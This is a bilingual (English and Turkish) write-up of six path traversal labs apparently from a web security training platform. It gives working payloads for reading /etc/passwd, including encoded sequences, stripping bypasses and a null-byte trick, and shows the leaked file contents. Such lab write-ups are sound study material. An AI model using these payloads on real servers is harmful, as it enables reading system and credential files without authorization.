#### 1.Lab: File path traversal, simple case
In this lab we are asked to retreive the content of the etc/passwd file. To do this we send a request with a filename property set to `etc/passwd`, it might not work onn the first time we simply need to add a few `../`, after three of them we finally get our result.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync 
...`

#### 2.Lab: File path traversal, traversal sequences blocked with absolute path bypass
To retreive the `etc/passwd` file we use an absolute path as directory traversal sequences are bocked in the filename property we write /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...

#### 3.Lab: File path traversal, traversal sequences stripped non-recursively

bu labda path traversal sekansını uygulama sildiği için ... ...// gibi ifadeler gireceğiz çünkü ortadaki .../ ifadesi kalkınca yine de aynı ifade kalacak. `filename=....//....//....//etc/passwd` ifadesini girdiğimizde labı çözmüş olacağız.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...

#### 4.Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
Bazen web sunucuları tüm path traversal ifadelerini silebiliyor, bunun için ecoded path traversal ifadeleri kullanmak zorunda kalabiliriz. %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd labı çözebiliriz.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

#### 5.Lab: File path traversal, validation of start of path
bu örnekte filepath başı yazmazsak uygulama hata veriyor, bundan mütevellit images interceptlenen paketin path başlangıcına bakıyoruz ardından klasik yapmamız gerekeni yapıyoruz 
filename=/var/www/images/../../../etc/passwd 

voila
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

#### 6.Lab: File path traversal, validation of file extension with null byte bypass
bu labda filepath .png ile bitmesi gerektiği için null byte (`%00`) kullanmamız gerekiyor. 
GET /image?filename=../../../etc/passwd%00.png HTTP/2

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

